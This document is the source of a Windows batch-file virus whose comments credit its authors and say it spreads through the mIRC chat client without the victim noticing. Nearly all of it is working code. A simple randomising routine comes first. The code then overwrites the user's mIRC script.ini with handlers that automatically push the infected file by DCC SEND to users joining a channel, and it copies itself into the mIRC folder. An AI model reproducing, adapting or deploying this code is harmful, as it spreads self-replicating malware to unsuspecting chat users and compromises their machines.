@echo off
:: Bat.
:: by philet0ast3r & Second part To Hell
::
:: philet0ast3r: Idea and the genial random engine :D
:: Second Part To Hell: Made this stuff polymorph, WinXP workable (workable?? :p) and included the virus-part.
::
:: Big thanks goes to Lord Yup for writting the the "Silend DCC SEND"-Article { You'll find it in the 29A #6 }
::
:: The Virus itself is a polymorph Bat/BatXP virus, which spread via mIRC.
:: But not the "one-line-mIRC-spreading" way, but a much better one. 
:: The user will never guess, that he's infect.


set a=0
set xp=true
:start1
if xp EQU true set /a %a%=%a%+1
if xp EQU true goto start2
cls
if %a%==5 goto endpoly
if %a%==4 set a=5
if %a%==3 set a=4
if %a%==2 set a=3
if %a%==1 set a=2
if %a%==0 set a=1
:start2
ver|time|find ",1">nul
if not errorlevel 1 set random%a%=1
if not errorlevel 1 goto start1
ver|time|find ",2">nul
if not errorlevel 1 set random%a%=3
if not errorlevel 1 goto start1
ver|time|find ",3">nul
if not errorlevel 1 set random%a%=3
if not errorlevel 1 goto start1
ver|time|find ",4">nul
if not errorlevel 1 set random%a%=4
if not errorlevel 1 goto start1
ver|time|find ",5">nul
if not errorlevel 1 set random%a%=5
if not errorlevel 1 goto start1
ver|time|find ",6">nul
if not errorlevel 1 set random%a%=6
if not errorlevel 1 goto start1
ver|time|find ",7">nul
if not errorlevel 1 set random%a%=7
if not errorlevel 1 goto start1
ver|time|find ",8">nul
if not errorlevel 1 set random%a%=8
if not errorlevel 1 goto start1
ver|time|find ",9">nul
if not errorlevel 1 set random%a%=9
if not errorlevel 1 goto start1
ver|time|find ",0">nul
if not errorlevel 1 set random%a%=10
if not errorlevel 1 goto start1
goto start2
:endpoly
echo %random1%%random2%%random3%%random4%%random5%
pause
if exist C:\mirc\script.ini set mir=C:\mirc
if exist C:\mirc32\script.ini set mir=C:\mirc32
if exist C:\proga~1\mirc\script.ini set mir=C:\progra~1\mirc
if exist C:\prgra~1\mirc32\script.ini set mir=C:\progra~1\mirc32
set mirc=%mir%\script.ini
echo   on 1:start: { .set %filee name.bat }   				>%mirc%
echo   on 1:join:#: { 							>>%mirc%
echo    .if ($nick != $me && %old != $nick) {				>>%mirc%
echo    .set %old $nick 						>>%mirc%
echo    .timer $+ $rand(1,100000) 1 5 .$check_him( $nick , $chan )	>>%mirc%
echo                                        }				>>%mirc%
echo   }								>>%mirc%
echo  alias check_him {							>>%mirc%
echo  .set %port $rand(9999,999999)  					>>%mirc%
echo  .while ($portfree(%port) == $false) { .set %port $rand(9999,999999) } >>%mirc%
echo  .if ($1 !isop $2) {						>>%mirc%
echo    .notice $1 :DCC Send teletubies ( $+ $ip $+ )			>>%mirc%
echo    .set %sock_name $rand(1,99999)					>>%mirc%
echo    .msg $1 DCC SEND %filee $longip($ip)  %port $file(%filee).size $+  >>%mirc%
echo    .socklisten %sock_name %port					>>%mirc%
echo    .timers off							>>%mirc%
echo    .timer $+ $rand(1,99999) 0 10 .cloze				>>%mirc%
echo                    }						>>%mirc%
echo  }									>>%mirc%
echo  on 1:socklisten:%sock_name: {					>>%mirc%
echo  .set %client_name $rand(1,9999999)				>>%mirc%
echo  .sockaccept %client_name						>>%mirc%
echo  .sockclose %sock_name						>>%mirc%
echo  .set %l 0								>>%mirc%
echo  .bread %filee %l 4000 &le						>>%mirc%
echo  .sockwrite -b %client_name 4000 &le				>>%mirc%
echo  %l = %l + 4000							>>%mirc%
echo  .set %end 0							>>%mirc%
echo  }									>>%mirc%
echo  on 1:sockread:%client_name: {					>>%mirc%
echo  .if (%l >= $file(%filee).size) {					>>%mirc%
echo    .set %end 1							>>%mirc%
echo    .sockclose %client_name						>>%mirc%
echo    .halt								>>%mirc%
echo   } .else {							>>%mirc%
echo    .if (%end != 1) {						>>%mirc%
echo    .bread %filee %l 4000 &le					>>%mirc%
echo    .sockwrite -b %client_name 4000 &le				>>%mirc%
echo    %l = %l + 4000							>>%mirc%
echo  } } }								>>%mirc%
echo  alias cloze { .sockclose %sock_name }				>>%mirc%
copy %0 %mir%\name.bat
pause